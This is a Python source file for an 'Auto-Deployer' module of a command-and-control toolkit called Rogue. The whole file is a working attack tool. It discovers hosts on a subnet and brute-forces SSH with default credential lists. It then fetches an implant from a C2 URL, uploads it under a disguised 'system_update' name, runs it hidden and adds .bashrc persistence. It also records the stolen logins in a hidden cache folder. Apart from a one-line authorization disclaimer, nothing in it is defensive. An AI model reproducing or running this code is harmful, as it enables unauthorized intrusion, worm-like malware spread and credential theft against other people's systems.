#!/usr/bin/env python3
"""
PAYLOAD: Auto-Deployer Module
DESCRIPTION: Automatically discovers and deploys implants to vulnerable hosts
AUTHOR: Rogue Red Team
VERSION: 2.0
SECURITY: This tool deploys implants - Use only on authorized systems
"""
import paramiko, socket, threading, queue, time, json, datetime, os, sys
import ipaddress, subprocess, re, random, hashlib, base64, urllib.request
from Cryptodome.Cipher import AES

class AutoDeployer:
    def __init__(self, network="192.168.1.0/24", implant_url=None, 
                 threads=10, timeout=5, output_dir="~/.cache/.rogue/deploy"):
        self.network = network
        self.implant_url = implant_url or "http://rogue-c2.example.com/rogue_implant.py"
        self.threads = threads
        self.timeout = timeout
        self.output_dir = os.path.expanduser(output_dir)
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.results = {
            "discovered": [],
            "deployed": [],
            "failed": [],
            "errors": []
        }
        
        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        
        # Common credentials for auto-attempt
        self.credentials = [
            {"user": "root", "passwords": ["root", "toor", "admin", "password", ""]},
            {"user": "admin", "passwords": ["admin", "password", "123456", ""]},
            {"user": "ubuntu", "passwords": ["ubuntu", ""]},
            {"user": "pi", "passwords": ["raspberry", ""]},
            {"user": "user", "passwords": ["user", "123456", ""]},
            {"user": "test", "passwords": ["test", ""]},
            {"user": "guest", "passwords": ["guest", ""]},
            {"user": "oracle", "passwords": ["oracle", ""]},
            {"user": "postgres", "passwords": ["postgres", ""]}
        ]
    
    def discover_hosts(self):
        """Discover live hosts in network"""
        live_hosts = []
        
        try:
            # Expand network range
            network = ipaddress.ip_network(self.network, strict=False)
            print(f"[+] Scanning {network.num_addresses} addresses in {self.network}")
            
            # Use multiple discovery methods
            discovery_methods = [
                self.ping_discovery,
                self.arp_discovery,
                self.port_discovery
            ]
            
            # Try each method
            all_hosts = set()
            for method in discovery_methods:
                try:
                    hosts = method(network)
                    all_hosts.update(hosts)
                except Exception as e:
                    print(f"[!] Discovery method failed: {e}")
            
            live_hosts = list(all_hosts)
            print(f"[+] Discovered {len(live_hosts)} live hosts")
            
        except Exception as e:
            print(f"[!] Host discovery failed: {e}")
        
        return live_hosts
    
    def ping_discovery(self, network):
        """Discover hosts using ICMP ping"""
        hosts = []
        
        # Create batch of IPs to ping
        ip_list = [str(ip) for ip in network.hosts()]
        
        # Use fping if available (faster)
        try:
            output = subprocess.check_output(
                f"fping -a -g {self.network} 2>/dev/null",
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode()
            hosts = output.strip().split('\n')
        except:
            # Fallback to sequential ping
            for ip in ip_list[:255]:  # Limit for speed
                try:
                    subprocess.check_call(
                        f"ping -c 1 -W 1 {ip} > /dev/null 2>&1",
                        shell=True
                    )
                    hosts.append(ip)
                except:
                    pass
        
        return hosts
    
    def arp_discovery(self, network):
        """Discover hosts using ARP"""
        hosts = []
        
        try:
            # Run arp-scan if available
            output = subprocess.check_output(
                f"arp-scan {self.network} 2>/dev/null | grep -E '^[0-9]' | awk '{{print $1}}'",
                shell=True
            ).decode()
            hosts = output.strip().split('\n')
        except:
            pass
        
        return hosts
    
    def port_discovery(self, network):
        """Discover hosts by scanning common ports"""
        hosts = []
        
        # Common ports to check
        common_ports = [22, 80, 443, 21, 23, 25, 3389]
        
        ip_list = [str(ip) for ip in network.hosts()][:255]  # Limit
        
        for ip in ip_list:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                
                for port in common_ports:
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        hosts.append(ip)
                        break
                
                sock.close()
            except:
                pass
        
        return hosts
    
    def try_ssh_deploy(self, host, username, password):
        """Attempt to deploy implant via SSH"""
        try:
            # Create SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect
            client.connect(
                hostname=host,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            print(f"[+] Connected to {host} as {username}")
            
            # Download implant
            implant_code = self.download_implant()
            if not implant_code:
                client.close()
                return False
            
            # Create implant filename
            implant_name = f"system_update_{random.randint(1000, 9999)}.py"
            
            # Upload implant
            sftp = client.open_sftp()
            remote_path = f"/tmp/{implant_name}"
            
            with sftp.file(remote_path, 'w') as f:
                f.write(implant_code)
            
            sftp.chmod(remote_path, 0o755)
            sftp.close()
            
            # Execute implant in background
            command = f"cd /tmp && nohup python3 {implant_name} > /dev/null 2>&1 &"
            
            stdin, stdout, stderr = client.exec_command(command)
            exit_code = stdout.channel.recv_exit_status()
            
            # Add persistence via .bashrc
            persistence_cmd = f'echo "cd /tmp && python3 {implant_name} 2>/dev/null &" >> ~/.bashrc'
            client.exec_command(persistence_cmd)
            
            client.close()
            
            if exit_code == 0:
                return True
            else:
                return False
            
        except Exception as e:
            return False
    
    def download_implant(self):
        """Download implant code from URL"""
        try:
            if self.implant_url.startswith('http'):
                response = urllib.request.urlopen(self.implant_url, timeout=10)
                return response.read().decode()
            else:
                # Assume local file
                with open(self.implant_url, 'r') as f:
                    return f.read()
        except Exception as e:
            print(f"[!] Failed to download implant: {e}")
            return None
    
    def worker(self):
        """Worker thread for processing deployment tasks"""
        while True:
            try:
                task = self.task_queue.get(timeout=1)
                if task is None:
                    break
                
                host = task
                
                print(f"[*] Attempting deployment to {host}")
                
                success = False
                tried_creds = []
                
                # Try each credential set
                for cred_set in self.credentials:
                    if success:
                        break
                    
                    user = cred_set["user"]
                    for password in cred_set["passwords"]:
                        tried_creds.append(f"{user}:{password}")
                        
                        if self.try_ssh_deploy(host, user, password):
                            with self.lock:
                                self.results["deployed"].append({
                                    "host": host,
                                    "username": user,
                                    "password": password,
                                    "timestamp": datetime.datetime.now().isoformat()
                                })
                            success = True
                            break
                        
                        # Delay between attempts
                        time.sleep(0.1)
                
                if not success:
                    with self.lock:
                        self.results["failed"].append({
                            "host": host,
                            "tried_credentials": tried_creds
                        })
                
                self.task_queue.task_done()
                
                # Random delay
                time.sleep(random.uniform(0.5, 2.0))
                
            except queue.Empty:
                break
            except Exception as e:
                print(f"[!] Worker error: {e}")
                continue
    
    def execute(self):
        """Execute auto-deployment"""
        try:
            print("[+] Starting auto-deployment...")
            print(f"[+] Network: {self.network}")
            print(f"[+] Implant URL: {self.implant_url}")
            
            # Discover hosts
            hosts = self.discover_hosts()
            self.results["discovered"] = hosts
            
            if not hosts:
                return "[!] No hosts discovered"
            
            print(f"[+] Discovered {len(hosts)} hosts. Starting deployment...")
            
            # Create tasks
            for host in hosts:
                self.task_queue.put(host)
            
            # Start worker threads
            threads = []
            for i in range(self.threads):
                thread = threading.Thread(target=self.worker)
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            # Wait for all tasks to complete
            self.task_queue.join()
            
            # Stop workers
            for i in range(self.threads):
                self.task_queue.put(None)
            
            for thread in threads:
                thread.join()
            
            # Generate report
            report = {
                "timestamp": datetime.datetime.now().isoformat(),
                "parameters": {
                    "network": self.network,
                    "implant_url": self.implant_url,
                    "threads": self.threads,
                    "timeout": self.timeout
                },
                "results": {
                    "discovered": len(self.results["discovered"]),
                    "deployed": len(self.results["deployed"]),
                    "failed": len(self.results["failed"])
                },
                "deployed_hosts": self.results["deployed"],
                "sample_failed": self.results["failed"][:5] if self.results["failed"] else []
            }
            
            # Save results
            output_file = os.path.join(self.output_dir, f"autodeploy_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            
            # Save deployed credentials
            creds_file = os.path.join(self.output_dir, f"deployed_credentials_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
            with open(creds_file, 'w') as f:
                for deployment in self.results["deployed"]:
                    f.write(f"{deployment['host']}:{deployment['username']}:{deployment['password']}\n")
            
            print(f"[+] Auto-deployment complete. Deployed to {len(self.results['deployed'])} hosts.")
            print(f"[+] Results saved to: {output_file}")
            print(f"[+] Credentials saved to: {creds_file}")
            
            return json.dumps(report["results"], indent=2)
            
        except Exception as e:
            return f"[!] Auto-deployment failed: {str(e)}"

def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Rogue Auto-Deployer')
    parser.add_argument('--network', default='192.168.1.0/24', help='Network range to scan')
    parser.add_argument('--implant-url', help='URL of implant to deploy')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout')
    
    args, unknown = parser.parse_known_args()
    
    deployer = AutoDeployer(
        network=args.network,
        implant_url=args.implant_url,
        threads=args.threads,
        timeout=args.timeout
    )
    
    return deployer.execute()

if __name__ == "__main__":
    # Example usage when run directly
    deployer = AutoDeployer(
        network="192.168.1.0/24",
        implant_url="https://rogue-c2.example.com/rogue_implant.py"
    )
    print(deployer.execute())
